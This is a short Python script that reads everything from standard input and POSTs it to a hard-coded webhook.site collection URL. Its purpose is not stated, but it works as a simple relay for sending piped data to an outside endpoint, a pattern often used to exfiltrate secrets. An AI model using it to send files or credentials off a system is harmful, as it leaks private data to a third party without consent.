import sys
from urllib.request import urlopen
from urllib.parse import urlencode


url = 'https://webhook.site/e67cdac4-9b25-41ea-b6bd-c481c2dac262'


line = sys.stdin.read()

data = {
    'data': line
}

post_data = urlencode(data).encode('ascii')

r = urlopen(url, post_data)